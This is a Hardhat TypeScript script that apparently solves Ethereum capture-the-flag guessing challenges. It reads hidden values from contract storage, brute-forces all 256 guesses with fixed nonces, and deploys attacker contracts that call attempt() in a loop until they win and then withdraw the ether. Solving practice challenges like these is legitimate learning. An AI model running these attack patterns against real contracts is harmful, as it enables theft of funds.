import { ethers } from "hardhat";

let signer: any
let one_eth = ethers.utils.parseEther('1.0')

function right_pad(b: Buffer, len: number, char = '\x00') {
	let newb = Buffer.alloc(len, b)
	return newb.fill(char, b.length, len)
}

async function setNickname() {
	let contract = new ethers.Contract(
		'0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee',
		[
			'function setNickname(bytes32 nickname) public'
		], signer
	)
	await contract.setNickname(right_pad(Buffer.from('quiark'), 32))
}

async function guessNumber() {             
    let contract = new ethers.Contract(    
        '0x2a359FA5f7cB00E100e972315426Df2DeB77906e',
        [                                  
            'function guess(uint8 n) public payable'
        ], signer                          
    )                                      
	await contract.guess(42, { value: ethers.utils.parseEther('1.0') })
	return contract
}

async function guessSecretNumber() {
	/* notes
	 * my addr: 0x86a0...
	 * deploying challanges
	 *		fn selector:	0x6ad4e87a
	 *		contract:		0x71c46ed333c35e4e6c62d32dc7c8f00d125b4fee
	 *		arguments:		challenge id
	 * guess function:
	 *		fn selector:	0x4ba4c16b (probably)
	 */
	let contract = new ethers.Contract(
		'0x233De54C8bd04bcC1BF6AC2d244dc3d5ae54bc18',
		[
			'function guess(uint8 n) public payable'
		], signer
	)
	let tx = await contract.guess(170, { value: ethers.utils.parseEther('1.0') })
	console.log(tx)
	return contract
}
                                     
async function guessRandomNumber() { 
    let blockNumber = 12846309       
    let timestamp = 1661233536       
    let prevBlockHash = '0x5fd2ec6c4ae9dce84b5b4178636c3b50fa882f3ba423015af80cb64f2e47258a'
                                     
    let contract = new ethers.Contract(
		'0xBd9399Fe56F9aC2Fdca5BE869a8b3C47d4010f30',
		[
			'function guess(uint8 n) public payable',
			'function isComplete() public view returns (bool)' 
		], signer
	)
	/*
	for (var ix = 0; ix < 10; ix++) {
		console.log('storage slot ', ix, 
			await ethers.provider.getStorageAt(contract.address, ix))
	}
	*/
	console.log('storage slot 0 ', await ethers.provider.getStorageAt(contract.address, 0))
	let tx = await contract.guess(
		0xb5,
		{ value: ethers.utils.parseEther('1.0') })

	console.log(tx)
	return contract
}

async function guessNewNumber() {
	let contract = new ethers.Contract(
		'0xfd4Aa751C7083F444eBF07822a3Ad98a97c40Cba',
		[
			'function guess(uint8 n) public payable',
			'function isComplete() public view returns (bool)' 
		], signer
	)

	let blockNumber = 10
	let now = 300
	// umm forget about predicting the value, let's just enumerate, shall we
	//let gas = await contract.estimateGas.guess(1, { value: one_eth })
	//console.log(gas)
	var nonce = await signer.getTransactionCount()

	for (let ix = 0; ix < 256; ix ++) {
		console.log('doing index ', ix)
		await contract.guess(ix, {
			value: one_eth,
			gasLimit: 31629,
			nonce: nonce
		})

		nonce += 1
	}

	return contract
}

async function attackNewNumber() {
	let target = new ethers.Contract(
		'0xfd4Aa751C7083F444eBF07822a3Ad98a97c40Cba',
		[
			'function guess(uint8 n) public payable',
            'function isComplete() public view returns (bool)' 
        ], signer                          
    )                                      
    let attackFactory = await ethers.getContractFactory('AttackNewNumber')
    let attack = await attackFactory.deploy(target.address)
    //let attack = attackFactory.attach('0xA25b90b7Ee6BaB71e25F80cd75CF7EAAF02Bc2E8')
    console.log('attecker deployed at ', attack.address)
    console.log('target bal before attack: ', 
                await ethers.provider.getBalance(target.address))
	for (var ix = 0; ix < 7; ix++) {
		let tx = await attack.attempt(31, { gasLimit: 150_000, value: one_eth })
        console.log(tx.hash)                        
    }                                      
    return target                          
}                                          
                                           
async function predictFutureChallenge() {  
    let target = new ethers.Contract(      
		'0xf557bcee726Ede3Dea255Ff20f73CCc20127C4E5',
		[
			'function guess(uint8 n) public payable',
            'function isComplete() public view returns (bool)'
        ], signer
    )

	let attackFactory = await ethers.getContractFactory('AttackTheFuture')
	//let attack = await attackFactory.deploy(target.address, { value: one_eth })
    let attack = attackFactory.attach('0x42a70530757074ad9bDc3E68Eda2985f9e330B7f')
    console.log('attecker deployed at ', attack.address)
	while (!await target.isComplete()) {
		let tx = await attack.attempt({ gasLimit: 150_000 })
		console.log(tx.hash)
	}
	await attack.withdraw();
	return target
}

async function predictBlockHashChallenge() {
    let target = new ethers.Contract(      
		'0x1D5641C9d03fa48b839A09C035cB103c38178E78',
		[
            'function isComplete() public view returns (bool)',
			'function lockInGuess(bytes32 hash) public payable',
			'function settle() public'
        ], signer
    )
	//let tx = await target.lockInGuess(Buffer.alloc(32, 0), { value: one_eth })
	let tx = await target.settle();
	console.log(tx)


	return null
}

async function main() {
	signer = (await ethers.getSigners())[0];
	console.log('signer', signer.address)

	let contract = await predictBlockHashChallenge()


	/*
	let challenge = new ethers.Contract(
		'0xBB1a1D6fCef0D50c71d599C58e84718e8a7E84ef',
		[ 'function isComplete() public view returns (bool)' ],
		signer
	)
	*/
    if (contract != null) {
		console.log('complete:', await (contract as any).isComplete())
	}
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
	console.error(error);
	process.exitCode = 1;
});
